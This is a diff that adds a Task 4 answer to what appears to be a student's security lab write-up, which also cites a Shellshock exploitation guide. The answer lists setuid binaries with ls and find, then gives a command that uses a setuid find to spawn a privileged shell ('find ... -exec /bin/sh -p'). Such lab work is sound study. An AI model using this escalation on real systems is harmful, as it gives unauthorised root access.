@@ -39,5 +39,25 @@ cite: https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-usi
 Task 4:
 <Your Explanation>
 
+  Command : ls -lArt /usr/bin | grep "rws"   OR    find /usr/bin -perm -u=s -type f
+
+-looked in /usr/bin for programs with setuid bit set
+-also used  find /usr/bin -perm -u=s -type f , which finds files with setuid and permission as root
+
+
+-find can be used to execute commands , like 
+find /usr/bin -exec /bin/sh -p \; 
+
+cite: https://gtfobins.github.io/gtfobins/find/#shell
+
+
+
+
+
+
+
+
+
+
 Task 5:
 <Your Explanation>
